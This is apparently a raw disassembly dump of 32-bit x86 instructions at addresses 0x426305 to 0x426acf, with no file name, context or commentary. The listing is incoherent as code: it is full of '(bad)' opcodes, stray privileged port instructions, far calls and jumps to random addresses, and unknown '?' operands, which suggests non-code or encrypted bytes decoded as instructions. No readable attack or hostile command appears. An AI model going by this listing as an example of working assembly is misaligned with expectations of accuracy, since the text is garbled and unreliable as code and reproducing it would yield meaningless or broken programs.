  426305:	mov    gs,WORD PTR [ebp-0x499b383d]
  42630b:	and    eax,0xf645e30
  426310:	sbb    al,0xc2
  426312:	loope  0x42634f
  426314:	mov    al,ds:0xfa5ad189
  426319:	inc    esp
  42631a:	ror    eax,1
  42631c:	or     al,0x64
  42631e:	or     al,0xe
  426320:	out    0x13,eax
  426322:	fimul  DWORD PTR [eax]
  426324:	lods   eax,DWORD PTR ds:[esi]
  426325:	mov    edx,0xf764ecf2
  42632a:	leave  
  42632b:	(bad)  
  42632c:	sbb    dl,BYTE PTR [edi]
  42632e:	(bad)  
  42632f:	mov    al,ds:0x46c1d256
  426334:	leave  
  426335:	cmp    ebx,ecx
  426337:	jl     0x426376
  426339:	(bad)  
  42633b:	ja     0x426347
  42633d:	sbb    al,0x88
  42633f:	arpl   WORD PTR [ebx],si
  426341:	mov    edx,0xab5ae19f
  426346:	dec    ebp
  426347:	adc    ecx,DWORD PTR [eax+0x32]
  42634a:	outs   dx,BYTE PTR ds:[esi]
  42634b:	dec    edx
  42634c:	cwde   
  42634d:	pop    eax
  42634e:	fs pop eax
  426350:	sahf   
  426351:	mov    ?,WORD PTR [edx+0x60]
  426354:	pop    ebp
  426355:	cmp    ch,dh
  426357:	pop    edx
  426358:	lods   eax,DWORD PTR ds:[esi]
  426359:	xchg   ebp,eax
  42635a:	ret    0x20e0
  42635d:	cmp    al,0xee
  42635f:	aam    0xaf
  426361:	pop    ebx
  426362:	jo     0x42639c
  426364:	jb     0x426375
  426366:	jge    0x426376
  426368:	clc    
  426369:	out    0x3a,al
  42636b:	xchg   edi,eax
  42636c:	sbb    eax,esp
  42636e:	dec    esp
  42636f:	dec    esp
  426370:	or     DWORD PTR [ebp+eiz*8-0x6b0a4413],0x5942a1fb
  42637b:	push   es
  42637c:	adc    DWORD PTR ds:0xa151ed25,ecx
  426382:	mov    ah,0x56
  426384:	jle    0x42635e
  426386:	fisttp QWORD PTR [eax+0x3468a241]
  42638c:	jmp    0xc63ac8e9
  426391:	(bad)  
  426392:	jge    0x42637a
  426394:	rcl    DWORD PTR [eax],cl
  426396:	xlat   BYTE PTR ds:[ebx]
  426397:	fdivrp st(4),st
  426399:	push   cs
  42639a:	int    0xe1
  42639c:	fsubr  QWORD PTR [edx+0x55]
  42639f:	jg     0x42640a
  4263a1:	cmp    esp,DWORD PTR [esp+ebx*2-0x5feaa18e]
  4263a8:	fwait
  4263a9:	mov    edi,0xb78eb173
  4263ae:	adc    al,0xd1
  4263b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263b1:	pop    eax
  4263b2:	push   esi
  4263b3:	scas   al,BYTE PTR es:[edi]
  4263b4:	xchg   edi,eax
  4263b5:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4263b7:	adc    DWORD PTR ds:0xccad1a8,ecx
  4263bd:	sar    DWORD PTR [edi+0x1387dcea],cl
  4263c3:	ja     0x4263e6
  4263c5:	(bad)  
  4263c6:	dec    ebx
  4263c7:	fnstenv [eax-0x65f12c6a]
  4263cd:	rcl    ah,1
  4263cf:	and    BYTE PTR [ebx+0x5575884d],cl
  4263d5:	mov    dl,0x46
  4263d7:	jno    0x4263a8
  4263d9:	mov    dh,0xf4
  4263db:	lock xchg ebp,eax
  4263dd:	dec    ebx
  4263de:	pusha  
  4263df:	mov    BYTE PTR [edx+0x6f475798],ah
  4263e5:	pop    es
  4263e6:	sub    dl,BYTE PTR [edi+0xd7b91f6]
  4263ec:	adc    eax,0x9f897212
  4263f1:	or     BYTE PTR [edi-0x6d],bh
  4263f4:	jecxz  0x42643b
  4263f6:	inc    esi
  4263f7:	mov    bl,0x5
  4263f9:	popf   
  4263fa:	jns    0x426451
  4263fc:	mov    al,0xb6
  4263fe:	lahf   
  4263ff:	loop   0x42644b
  426401:	dec    ebp
  426402:	ror    cl,1
  426404:	jp     0x4263d9
  426406:	cmp    eax,0x8882daf5
  42640b:	sbb    ebp,ebp
  42640d:	sbb    DWORD PTR [esi],ebp
  42640f:	into   
  426410:	push   ss
  426411:	cmp    BYTE PTR [esi+0x101f7405],ch
  426417:	or     eax,DWORD PTR [edi]
  426419:	jge    0x426487
  42641b:	(bad)
  42641e:	ss xchg esi,eax
  426420:	popa   
  426421:	jecxz  0x426470
  426423:	outs   dx,BYTE PTR ds:[esi]
  426424:	add    edx,ebp
  426426:	mov    ah,0x5a
  426428:	enter  0x3f36,0x21
  42642c:	stos   DWORD PTR es:[edi],eax
  42642d:	or     esi,DWORD PTR [ecx]
  42642f:	fst    QWORD PTR [esi-0x4c]
  426432:	mov    dh,0x5c
  426434:	sbb    DWORD PTR [edx+ecx*4-0x7aa83d54],edi
  42643b:	cld    
  42643c:	push   ds
  42643d:	and    cl,BYTE PTR [eax]
  42643f:	inc    esi
  426440:	aaa    
  426441:	and    DWORD PTR [edx+0x16],esp
  426444:	push   cs
  426445:	lods   al,BYTE PTR ds:[esi]
  426446:	lea    ecx,[eax-0x1d]
  426449:	imul   al
  42644b:	sub    al,0x74
  42644d:	adc    esi,edi
  42644f:	adc    BYTE PTR [edi],0xc6
  426452:	sub    ebx,DWORD PTR [eax]
  426454:	mov    edi,0xfe10ed6c
  426459:	jbe    0x4264b2
  42645b:	mov    WORD PTR [edx+eax*1],?
  42645e:	sahf   
  42645f:	and    cl,BYTE PTR [edx-0x31a398b6]
  426465:	mov    edi,0xaf3b2451
  42646a:	push   ss
  42646b:	sub    eax,0x1c612389
  426470:	(bad)  
  426471:	popa   
  426472:	pusha  
  426473:	imul   BYTE PTR [ebp-0x2d]
  426476:	and    al,0xce
  426478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426479:	dec    esp
  42647a:	mov    ch,BYTE PTR [edx-0x7b]
  42647d:	ins    BYTE PTR es:[edi],dx
  42647e:	pusha  
  42647f:	test   DWORD PTR [ecx],eax
  426481:	jmp    0x52b2:0x9dcbabaf
  426488:	pop    eax
  426489:	std    
  42648a:	cld    
  42648b:	repz mov WORD PTR [esi+0x30799586],cs
  426492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426493:	add    bh,al
  426495:	xchg   ecx,eax
  426496:	imul   DWORD PTR [edi+0x2d6632ab]
  42649c:	jbe    0x4264bc
  42649e:	add    al,0xb0
  4264a0:	push   edx
  4264a1:	mov    ch,0xd8
  4264a3:	in     al,dx
  4264a4:	xchg   DWORD PTR [esi+0x6911874f],edx
  4264aa:	clc    
  4264ab:	jecxz  0x4264f5
  4264ad:	dec    eax
  4264ae:	out    0x8a,eax
  4264b0:	mov    ebx,0x5f8b46c6
  4264b5:	scas   eax,DWORD PTR es:[edi]
  4264b6:	adc    al,0x70
  4264b8:	or     edx,DWORD PTR [edi]
  4264ba:	clc    
  4264bb:	jp     0x426456
  4264bd:	xchg   ebp,eax
  4264be:	push   0xffffffac
  4264c0:	lods   al,BYTE PTR ds:[esi]
  4264c1:	push   esp
  4264c2:	ins    DWORD PTR es:[edi],dx
  4264c3:	and    al,0x80
  4264c5:	fdivrp st(6),st
  4264c7:	popa   
  4264c8:	jne    0x42645d
  4264ca:	cmp    al,0x2f
  4264cc:	into   
  4264cd:	js     0x4264e3
  4264cf:	rol    BYTE PTR [edi],cl
  4264d1:	(bad)  
  4264d2:	pop    edi
  4264d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264d4:	loope  0x426490
  4264d6:	out    0x18,al
  4264d8:	test   BYTE PTR [ebx],bl
  4264da:	jmp    0x8f61d14a
  4264df:	fs ja  0x4264b1
	...
  4264ea:	dec    ecx
  4264eb:	push   ebp
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	add    al,0x54
  4264f8:	psubusw mm2,QWORD PTR [eax-0xe]
  4264fc:	add    DWORD PTR [eax],eax
  4264fe:	add    BYTE PTR [esi],0x0
  426501:	add    BYTE PTR [ebp-0x3873e7ea],dh
  426507:	cdq    
  426508:	out    dx,eax
  426509:	cmc    
  42650a:	mov    bh,0x33
  42650c:	fstp   TBYTE PTR [ebx+esi*8+0x1c]
  426510:	imul   edx,DWORD PTR [eax],0x75
  426513:	mov    ah,0xba
  426515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426516:	mov    ebp,fs
  426518:	xchg   BYTE PTR ds:[ecx-0x75644ed7],dh
  42651f:	mov    edx,ebp
  426521:	leave  
  426522:	call   0xaa9ba2cd
  426527:	sbb    eax,0x61386e36
  42652c:	mov    ebp,DWORD PTR [edx-0x509c7cdc]
  426532:	xor    bl,BYTE PTR [ecx-0x2]
  426535:	add    ch,BYTE PTR [edi]
  426537:	popa   
  426538:	and    eax,0x3784acc5
  42653d:	sub    edi,ecx
  42653f:	push   edi
  426540:	cdq    
  426541:	stc    
  426542:	fstp   DWORD PTR ds:0x5f9523a
  426548:	mul    BYTE PTR [edi+0x794e9d80]
  42654e:	pop    ebp
  42654f:	push   0xfffffff9
  426551:	cmp    BYTE PTR [ecx-0x2b74831c],dl
  426557:	ror    bh,1
  426559:	inc    ebp
  42655a:	(bad)  
  42655c:	add    al,0x38
  42655e:	and    bh,BYTE PTR [eax]
  426560:	mov    WORD PTR [eax+0x43ca2547],?
  426566:	in     al,dx
  426567:	aaa    
  426568:	aas    
  426569:	iret   
  42656a:	in     al,0x27
  42656c:	(bad)  
  42656d:	adc    cl,al
  42656f:	rcr    DWORD PTR [edi+0xab8649e],1
  426575:	adc    BYTE PTR ds:0x6ebeb408,cl
  42657b:	add    DWORD PTR [ecx-0x284e108],eax
  426581:	lahf   
  426582:	xchg   esi,eax
  426583:	push   edi
  426584:	jbe    0x42657e
  426586:	adc    al,0xe8
  426588:	mov    DWORD PTR [eax+0x28],eax
  42658b:	ss xchg edi,ebp
  42658e:	add    dl,BYTE PTR [ecx+0x46114e73]
  426594:	cmc    
  426595:	and    eax,0xd64137b0
  42659a:	(bad)  
  42659b:	iret   
  42659c:	(bad)  
  42659d:	(bad)  
  42659e:	cmp    eax,0xc4324671
  4265a3:	in     al,0xed
  4265a5:	dec    ecx
  4265a6:	dec    esp
  4265a7:	stc    
  4265a8:	arpl   WORD PTR [eax+0x7e],bp
  4265ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265ac:	test   al,0xcb
  4265ae:	adc    DWORD PTR [ecx+0x74],esp
  4265b1:	ja     0x426570
  4265b3:	stos   BYTE PTR es:[di],al
  4265b5:	icebp  
  4265b6:	(bad)  [eax+edx*2+0xa]
  4265ba:	cmp    al,0xdb
  4265bc:	fld    TBYTE PTR [esi-0x1d]
  4265bf:	mov    BYTE PTR [esi-0x24],bl
  4265c2:	cld    
  4265c3:	inc    esi
  4265c4:	xchg   esi,eax
  4265c5:	ins    DWORD PTR es:[edi],dx
  4265c6:	add    bl,BYTE PTR [ecx+edi*4-0x36]
  4265ca:	xchg   ebx,eax
  4265cb:	sar    BYTE PTR [ecx],1
  4265cd:	scas   al,BYTE PTR es:[edi]
  4265ce:	xchg   esi,eax
  4265cf:	rol    edi,cl
  4265d1:	pop    eax
  4265d2:	or     edx,esp
  4265d4:	cli    
  4265d5:	stos   BYTE PTR es:[edi],al
  4265d6:	add    dl,BYTE PTR [ecx+esi*4]
  4265d9:	xchg   ecx,eax
  4265da:	popa   
  4265db:	xor    dh,cl
  4265dd:	dec    ebp
  4265de:	(bad)  
  4265df:	adc    edi,DWORD PTR [edi-0x52]
  4265e2:	jecxz  0x4265dd
  4265e4:	inc    ebx
  4265e5:	je     0x42661c
  4265e7:	pop    edi
  4265e8:	sub    DWORD PTR ss:[ecx+0x19],ebx
  4265ec:	xor    dh,dl
  4265ee:	jnp    0x4265c2
  4265f0:	add    DWORD PTR [edx-0x21],ebx
  4265f3:	mov    eax,0xb53c47ae
  4265f8:	inc    edx
  4265f9:	je     0x426614
  4265fb:	sub    DWORD PTR [esi],0xfffffff3
  4265fe:	jo     0x4265d9
  426600:	inc    ebx
  426601:	jl     0x4265f0
  426603:	jno    0x426654
  426605:	rol    BYTE PTR [esp+edi*1+0x6c6f98c4],0xd
  42660d:	dec    ecx
  42660e:	and    dl,dl
  426610:	push   esp
  426611:	jge    0x42667a
  426613:	cmp    bl,BYTE PTR [ebx+0x6dd1a792]
  426619:	mov    ebp,0xcd4e86c6
  42661e:	jp     0x426617
  426620:	xchg   edx,edi
  426622:	cmp    ah,bl
  426624:	dec    edi
  426625:	and    BYTE PTR [esi-0x3e],ch
  426628:	pop    ss
  426629:	jle    0x426699
  42662b:	adc    dl,ah
  42662d:	adc    DWORD PTR [ecx-0x3a],ecx
  426630:	xor    eax,0xd6362e3c
  426635:	cmp    DWORD PTR [esi],0x981a724f
  42663b:	mov    ds,WORD PTR [esi-0xe108862]
  426641:	xchg   ebp,eax
  426642:	jbe    0x4265c4
  426644:	shr    bl,cl
  426646:	xchg   esi,eax
  426647:	xchg   ebp,eax
  426648:	out    0x48,al
  42664a:	xchg   ebx,eax
  42664b:	aas    
  42664c:	cdq    
  42664d:	je     0x426672
  42664f:	fisubr WORD PTR [ecx]
  426651:	mov    al,ds:0xaefa287e
  426656:	fs jae 0x4266d8
  426659:	je     0x42660f
  42665b:	out    0x97,eax
  42665d:	mov    edx,0x90f02048
  426662:	sub    ah,BYTE PTR [ebp-0x3fa2b5b7]
  426668:	shr    DWORD PTR [edi],cl
  42666a:	and    eax,0x1ec9599d
  42666f:	xchg   edx,eax
  426670:	shl    BYTE PTR [edi+0x315d1e7d],cl
  426676:	pop    ebx
  426677:	fiadd  DWORD PTR [edi+0x2a263cb9]
  42667d:	or     ah,ah
  42667f:	xchg   DWORD PTR [ecx+0x71],ebp
  426682:	jbe    0x4266b8
  426684:	aam    0xc8
  426686:	rol    DWORD PTR [edi],1
  426688:	clc    
  426689:	pop    edx
  42668a:	dec    edi
  42668b:	jo     0x4266f5
  42668d:	push   ecx
  42668e:	push   ss
  42668f:	mov    edi,0x9bd11852
  426694:	inc    ebx
  426695:	pop    edi
  426696:	mov    ch,0xf2
  426698:	mov    edx,0xf1671407
  42669d:	xor    dl,cl
  42669f:	jo     0x426648
  4266a1:	fcomp  DWORD PTR [edx+0x30]
  4266a4:	lea    ebx,[eax-0x6fbcea01]
  4266aa:	mov    bl,0x94
  4266ac:	sbb    eax,DWORD PTR [edi]
  4266ae:	and    BYTE PTR [ecx+0x503c938],0x0
  4266b5:	inc    ebx
  4266b6:	xchg   edi,eax
  4266b7:	jno    0x42671a
  4266b9:	fwait
  4266ba:	ret    
  4266bb:	sahf   
  4266bc:	jecxz  0x42665a
  4266be:	push   esp
  4266bf:	je     0x42673b
  4266c1:	pop    ecx
  4266c2:	pop    edi
  4266c3:	ins    DWORD PTR es:[edi],dx
  4266c4:	fidivr DWORD PTR [ecx]
  4266c6:	sti    
  4266c7:	clc    
  4266c8:	cmp    al,0x90
  4266ca:	mov    ds:0xf3b9a293,eax
  4266cf:	dec    ecx
  4266d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266d1:	push   ecx
  4266d2:	adc    al,0xd0
  4266d4:	std    
  4266d5:	mov    ebx,0xcf0a6409
  4266da:	or     eax,0x92e49736
  4266df:	push   0xffffffce
  4266e1:	jo     0x42671a
  4266e3:	lea    eax,[ebx+0x70]
  4266e6:	in     eax,0x4d
  4266e8:	inc    edx
  4266e9:	fstp   TBYTE PTR [eax]
  4266eb:	call   0x6fe0:0xbb6234d7
  4266f2:	add    al,BYTE PTR [ebp-0x6a]
  4266f5:	loop   0x4266a4
  4266f7:	xchg   BYTE PTR [edx-0x39609e5e],bl
  4266fd:	adc    esi,DWORD PTR [eax+0x7b]
  426700:	xor    DWORD PTR [ebx+0x1b],edi
  426703:	push   esi
  426704:	clc    
  426705:	arpl   WORD PTR [edi-0x37],sp
  426708:	or     ebx,DWORD PTR [edi]
  42670a:	call   0xfd2f:0xde25b72
  426711:	push   esp
  426712:	pop    esp
  426713:	xchg   DWORD PTR [edx],esi
  426715:	mov    dl,0x64
  426717:	add    cl,dh
  426719:	(bad)  
  42671a:	js     0x426778
  42671c:	cdq    
  42671d:	nop
  42671e:	imul   eax,ecx,0x6ebd4004
  426724:	jne    0x426767
  426726:	xchg   edi,eax
  426727:	dec    eax
  426728:	stc    
  426729:	mov    edx,esp
  42672b:	jb     0x4266fa
  42672d:	xchg   ebx,eax
  42672e:	cmp    al,0x48
  426730:	(bad)  
  426731:	fwait
  426732:	inc    edx
  426733:	test   ebp,esi
  426735:	and    al,BYTE PTR [ecx+0x763ff9d3]
  42673b:	dec    eax
  42673c:	sub    al,0x8f
  42673e:	sbb    ch,dh
  426740:	dec    edx
  426741:	call   0x9370:0x12f27ec0
  426748:	inc    ecx
  426749:	mov    esi,0x83cdded2
  42674e:	out    dx,eax
  42674f:	fisttp QWORD PTR [edx+0x5fe1b9a]
  426755:	test   eax,0xcd5cd3fa
  42675a:	mov    edx,0x4a13673a
  42675f:	stos   BYTE PTR es:[edi],al
  426760:	loope  0x4267bd
  426762:	push   ebx
  426763:	out    dx,eax
  426764:	int    0xe5
  426766:	mov    eax,ds:0x69df2d9c
  42676b:	repz addr16 push edi
  42676e:	pop    ebp
  42676f:	cwde   
  426770:	(bad)
  426774:	lds    eax,FWORD PTR [eax]
  426776:	sbb    ebp,edi
  426778:	push   0x44
  42677a:	pusha  
  42677b:	and    eax,0x9a1c1375
  426780:	inc    DWORD PTR [eax]
  426782:	xchg   ebp,eax
  426783:	dec    ecx
  426784:	cmp    eax,DWORD PTR ds:0x630d43d2
  42678a:	jnp    0x4267e3
  42678c:	test   dh,dl
  42678e:	fist   WORD PTR ds:0x772aa0f7
  426794:	add    BYTE PTR [edx-0x2c],ah
  426797:	jmp    0x426748
  426799:	ret    
  42679a:	jmp    0x612406d6
  42679f:	aaa    
  4267a0:	arpl   si,si
  4267a2:	daa    
  4267a3:	in     eax,0x58
  4267a5:	stos   BYTE PTR es:[edi],al
  4267a6:	cli    
  4267a7:	fadd   QWORD PTR [ecx+edx*8-0x1de8e853]
  4267ae:	test   DWORD PTR [ebx],esi
  4267b0:	jle    0x4267a4
  4267b2:	es mov ebx,0xb43cf817
  4267b8:	push   esi
  4267b9:	inc    eax
  4267ba:	shr    DWORD PTR [ebx+0x6],0xbe
  4267be:	mov    eax,0xce130716
  4267c3:	jno    0x426796
  4267c5:	xchg   esi,eax
  4267c6:	in     al,0xbc
  4267c8:	fldl2t 
  4267ca:	jmp    0xbc493e5f
  4267cf:	je     0x4267cc
  4267d1:	pop    ebx
  4267d2:	or     eax,0x4df38b98
  4267d7:	jmp    0x78aa4b03
  4267dc:	ja     0x4267d9
  4267de:	adc    al,0x45
  4267e0:	out    dx,al
  4267e1:	push   esp
  4267e2:	fisubr DWORD PTR [ebp-0x44]
  4267e5:	(bad)  
  4267e6:	fild   DWORD PTR [edx+eiz*2]
  4267e9:	ds mov edi,0x2c88f477
  4267ef:	imul   ebp,DWORD PTR [eax],0x7cc8d33
  4267f5:	or     dl,bh
  4267f7:	imul   ebp,DWORD PTR [edx+0x25],0xb4ede842
  4267fe:	pop    ecx
  4267ff:	push   ecx
  426800:	jne    0x4267f8
  426802:	(bad)  
  426803:	mov    BYTE PTR [eax+0x3ebe22ec],bh
  426809:	int3   
  42680a:	jp     0x42685e
  42680c:	idiv   DWORD PTR [eax+0x222e4466]
  426812:	sub    edi,DWORD PTR [edi-0x1fad9aaf]
  426818:	add    eax,0xf6277375
  42681d:	pop    ecx
  42681e:	sub    al,0xbe
  426820:	jge    0x42683e
  426822:	(bad)  
  426823:	push   0xffffffb1
  426825:	or     DWORD PTR [ebp*1+0x2a83dcfc],edi
  42682c:	jns    0x42686c
  42682e:	xor    BYTE PTR [edx+0x66],ch
  426831:	adc    dh,BYTE PTR [esi-0x7a59a384]
  426837:	fdivr  DWORD PTR ds:0xcda0f635
  42683d:	push   ebp
  42683e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42683f:	mov    al,0xb4
  426841:	push   cs
  426842:	lods   al,BYTE PTR ds:[esi]
  426843:	sub    BYTE PTR [eax],bh
  426845:	pushf  
  426846:	pop    ecx
  426847:	icebp  
  426848:	jns    0x4268ad
  42684a:	enter  0x9fd1,0x2
  42684e:	push   0x55
  426850:	mov    ebx,?
  426852:	aam    0x46
  426854:	pop    ebx
  426855:	retf   
  426856:	xor    bl,ch
  426858:	mov    ebp,0xf458d2c3
  42685d:	imul   BYTE PTR [esp+eax*4-0x34]
  426861:	enter  0xdb0d,0x18
  426865:	dec    esp
  426866:	mov    fs,WORD PTR [ebx]
  426868:	out    0x75,al
  42686a:	cdq    
  42686b:	gs nop
  42686d:	fsubr  QWORD PTR [ebx-0x391803d9]
  426873:	cmp    al,0xfa
  426875:	mov    al,0x75
  426877:	aam    0x68
  426879:	jb     0x4268ec
  42687b:	data16 and al,0x5b
  42687e:	jno    0x4268d9
  426880:	mov    al,0x4a
  426882:	aam    0xa5
  426884:	xchg   edi,eax
  426885:	stos   DWORD PTR es:[edi],eax
  426886:	fcomp  QWORD PTR [eax-0x413e8f8d]
  42688c:	xchg   ebx,eax
  42688d:	add    ebp,esi
  42688f:	jecxz  0x4268c0
  426891:	dec    edi
  426892:	call   0xad7225b0
  426897:	in     eax,0x47
  426899:	mov    dl,0xdb
  42689b:	add    al,0x92
  42689d:	enter  0x47a9,0xfc
  4268a1:	and    al,0x45
  4268a3:	loop   0x4268ff
  4268a5:	push   ecx
  4268a6:	lods   eax,DWORD PTR ds:[esi]
  4268a7:	repz fiadd WORD PTR [eax+0x4cce4609]
  4268ae:	dec    eax
  4268af:	mov    eax,0x5b3862d0
  4268b4:	xchg   ebp,eax
  4268b5:	pop    ecx
  4268b6:	mov    BYTE PTR [edi+0x2],dl
  4268b9:	add    bl,BYTE PTR [edx]
  4268bb:	(bad)  
  4268bc:	das    
  4268bd:	jmp    0x42689c
  4268bf:	or     eax,ebp
  4268c1:	pop    eax
  4268c2:	and    eax,0xa46adf68
  4268c7:	dec    ebp
  4268c8:	mov    ebp,0xc67eddc8
  4268cd:	and    bh,BYTE PTR [edi]
  4268cf:	dec    ecx
  4268d0:	xchg   edi,eax
  4268d1:	das    
  4268d2:	mov    WORD PTR [esi-0x59],ss
  4268d5:	ins    DWORD PTR es:[edi],dx
  4268d6:	and    DWORD PTR [edx+0x31e20493],ebx
  4268dc:	sahf   
  4268dd:	mov    esp,0xce974c83
  4268e2:	loope  0x4268cf
  4268e4:	icebp  
  4268e5:	ja     0x4268c6
  4268e7:	jbe    0x856f6e03
  4268ed:	lds    edi,FWORD PTR [ecx+0x7d06fd5e]
  4268f3:	inc    eax
  4268f4:	add    ch,cl
  4268f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268f7:	(bad)  
  4268f8:	lahf   
  4268f9:	fdivr  st,st(7)
  4268fb:	(bad)  
  4268fc:	dec    esi
  4268fd:	test   ch,0xbb
  426900:	inc    ebp
  426901:	add    DWORD PTR [ebp-0x3520401f],0xffffffc8
  426908:	and    al,0xd7
  42690a:	xor    DWORD PTR [eax+0x3e],0xffffffec
  42690e:	mov    edi,0x9af91753
  426913:	sar    edx,0x89
  426916:	cdq    
  426917:	mov    DWORD PTR [ecx+0xa],0x92ee1f1d
  42691e:	(bad)  
  42691f:	mov    edx,DWORD PTR [esi+ecx*4]
  426922:	or     al,0x8c
  426924:	das    
  426925:	(bad)  
  426926:	jle    0x4268c8
  426928:	int3   
  426929:	add    dl,BYTE PTR [ebp+0x49]
  42692c:	adc    DWORD PTR [eax+0x231ec87f],esp
  426932:	fisubr DWORD PTR [edi+0x13]
  426935:	jb     0x42694b
  426937:	cmc    
  426938:	xor    esi,DWORD PTR [edx+0x10]
  42693b:	xchg   ebx,eax
  42693c:	addr16 push 0xffffffd0
  42693f:	push   ds
  426940:	jmp    0x426904
  426942:	scas   al,BYTE PTR es:[edi]
  426943:	mov    ds:0xe74b45a2,eax
  426948:	cld    
  426949:	cmp    BYTE PTR [esp+ebp*1],ah
  42694c:	std    
  42694d:	ret    0x269b
  426950:	inc    ecx
  426951:	arpl   WORD PTR [ebx-0x4651eb7e],cx
  426957:	cmc    
  426958:	out    dx,eax
  426959:	xor    eax,0x7841e3c0
  42695e:	je     0x426942
  426960:	mov    al,ds:0x9e65cf24
  426965:	push   eax
  426966:	aad    0xf2
  426968:	push   edi
  426969:	lds    ebp,FWORD PTR [esi-0x2ca2bf7b]
  42696f:	aad    0x5a
  426971:	arpl   WORD PTR [ebx+0x2e1dfcfc],dx
  426977:	jne    0x426945
  426979:	test   eax,0x46b988f4
  42697e:	loopne 0x4269d5
  426980:	dec    ch
  426982:	test   eax,0x9c209552
  426987:	pop    ebx
  426988:	pop    esi
  426989:	lahf   
  42698a:	mov    WORD PTR [ebp-0x39],fs
  42698d:	xor    BYTE PTR [ebx+0x4e],dh
  426990:	nop
  426991:	out    0x9f,eax
  426993:	or     al,0x4c
  426995:	lahf   
  426996:	xchg   BYTE PTR gs:[edi],ch
  426999:	cmp    bl,ah
  42699b:	fmul   st(3),st
  42699d:	and    DWORD PTR [ecx+0x30],ebp
  4269a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269a1:	mov    edx,eax
  4269a3:	jnp    0x4269a5
  4269a5:	adc    eax,0x925b7c24
  4269aa:	in     al,dx
  4269ab:	pop    esp
  4269ac:	mul    BYTE PTR [edx-0x29]
  4269af:	aad    0x7a
  4269b1:	repnz test al,0xa7
  4269b4:	xor    DWORD PTR [ebx-0xf],ebx
  4269b7:	xor    al,0xda
  4269b9:	push   eax
  4269ba:	(bad)  
  4269bb:	ins    DWORD PTR es:[edi],dx
  4269bc:	sub    DWORD PTR [esi+0x26],0x77
  4269c0:	btr    eax,ebx
  4269c3:	jno    0x42696e
  4269c5:	sti    
  4269c6:	mov    esi,0xc719795f
  4269cb:	dec    esi
  4269cc:	rcl    DWORD PTR [edx+eax*8+0x5703c8f1],cl
  4269d3:	and    al,0x6
  4269d5:	(bad)  
  4269d6:	popa   
  4269d7:	outs   dx,DWORD PTR ss:[esi]
  4269d9:	mov    bl,0x7c
  4269db:	cmp    DWORD PTR [ebx+0x7a5c9255],0xc87c4b8a
  4269e5:	cmp    BYTE PTR [edx+edx*2],0x7e
  4269e9:	xchg   ebp,eax
  4269ea:	xchg   esp,eax
  4269eb:	outs   dx,DWORD PTR ds:[esi]
  4269ec:	popa   
  4269ed:	xchg   esp,eax
  4269ee:	push   eax
  4269ef:	fcmovnu st,st(2)
  4269f1:	shl    BYTE PTR [eax],0x88
  4269f4:	test   ecx,esi
  4269f6:	mov    ds:0x74eff719,al
  4269fb:	call   0xdaca:0x29e9ee94
  426a02:	cs add al,0x8a
  426a05:	das    
  426a06:	and    dl,cl
  426a08:	xor    al,0x60
  426a0a:	arpl   WORD PTR ds:0x63cf1074,dx
  426a10:	fldcw  WORD PTR [edi]
  426a12:	push   eax
  426a13:	stos   DWORD PTR es:[edi],eax
  426a14:	and    BYTE PTR [edx+0x0],0xd5
  426a18:	xchg   DWORD PTR [ebp+0x2a],esp
  426a1b:	mov    ch,0x2c
  426a1d:	mov    edi,0x1b9f32bd
  426a22:	jne    0x426a5f
  426a24:	adc    al,0xd
  426a26:	cld    
  426a27:	xchg   edi,eax
  426a28:	repz sbb BYTE PTR [edx],bh
  426a2b:	mov    ebx,0x66a3e1f6
  426a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a31:	mov    ebp,0x59350cee
  426a36:	rol    BYTE PTR [edx+ebx*1],1
  426a39:	adc    bl,BYTE PTR [edx+ebx*4+0x28]
  426a3d:	ins    BYTE PTR es:[edi],dx
  426a3e:	and    BYTE PTR [ecx+0x7],cl
  426a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a42:	hlt    
  426a43:	xor    DWORD PTR [edx-0x3983e4a9],eax
  426a49:	sbb    eax,0x4f5a8461
  426a4e:	cmp    BYTE PTR [ebp+0x7a],bh
  426a51:	xor    eax,0x4ae7ffa1
  426a56:	or     al,0xc6
  426a58:	call   0x136f:0xc909b407
  426a5f:	xchg   ecx,eax
  426a60:	test   dh,0x65
  426a63:	cmp    edi,DWORD PTR [eax-0x32f011db]
  426a69:	xchg   BYTE PTR [ebx],cl
  426a6b:	inc    eax
  426a6c:	jo     0x426a1d
  426a6e:	daa    
  426a6f:	int    0xa7
  426a71:	mov    ecx,0x80941aa0
  426a76:	(bad)  
  426a77:	cmc    
  426a78:	cmp    al,0x7d
  426a7a:	sub    eax,0x14a53b33
  426a7f:	adc    al,BYTE PTR [edx-0x150a76f8]
  426a85:	icebp  
  426a86:	nop
  426a87:	out    dx,al
  426a88:	push   DWORD PTR [ebx+ecx*8]
  426a8b:	mov    ah,ah
  426a8d:	mov    ds:0x21372787,al
  426a92:	xchg   ebp,eax
  426a93:	jno    0x426a85
  426a95:	mov    esi,0xb7f99deb
  426a9a:	xchg   esp,eax
  426a9b:	sbb    eax,0xc7b4a7e1
  426aa0:	xor    DWORD PTR [esi-0x6f],0x42ac2dac
  426aa7:	xor    DWORD PTR [eax-0x1e135b4],eax
  426aad:	out    dx,eax
  426aae:	push   ds
  426aaf:	(bad)  
  426ab0:	jmp    0xe862:0x9eeb0bc1
  426ab7:	jmp    0x426a56
  426ab9:	lods   al,BYTE PTR ds:[esi]
  426aba:	hlt    
  426abb:	sbb    eax,0x6c444196
  426ac0:	loop   0x426b1e
  426ac2:	(bad)  
  426ac3:	cmp    ecx,DWORD PTR [edi-0x5835bec4]
  426ac9:	xor    eax,0x8a806a17
  426ace:	pop    esi
  426acf:	mov    eax,ds:0x28b43665
